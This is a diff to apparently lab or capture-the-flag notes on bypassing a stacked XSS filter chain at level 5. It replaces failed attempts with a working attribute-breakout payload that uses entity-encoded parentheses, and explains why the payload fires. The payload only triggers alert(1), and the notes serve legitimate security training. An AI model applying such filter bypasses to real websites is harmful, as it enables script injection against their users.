@@ -32,17 +32,10 @@ Multiple stacked filters (tag blacklist, event-handler regex, protocol strip, lo
 
 ### filterchain-level5
 
-`/filterchain/level5/?query=%20onmouseover=alert%601%60%20x=`
-
-- payload: ` onmouseover=alert\`1\` x=`
-- context: angles/parens/backticks stripped — actually backticks stripped too, so use attribute breakout with quote: `" onmouseover=confirm\`1\` x="` won't work without parens/backticks. Use `" autofocus onfocus=alert\`1\` x="` — backtick blocked. Alternative: `" onclick=alert(1) x="` — parens blocked. Use throw-without-parens:
-
-### filterchain-level5 (working)
-
-`/filterchain/level5/?query=%22%20onmouseover=alert%26%23x28;1%26%23x29;%20x=%22`
+`/filterchain/level5/?query=%22%20onmouseover=alert%26%23x28%3B1%26%23x29%3B%20x=%22`
 
 - payload: `" onmouseover=alert&#x28;1&#x29; x="`
-- context: parens/backticks/angles stripped; entity-encoded parens decode at parse time in attribute
+- context: reflection in `<div class="…">`; angles/parens/backticks stripped but quotes survive — break out with `"` and use entity-encoded parens, which decode in the attribute value at parse time (fires on mouseover)
 
 ### filterchain-level6
 
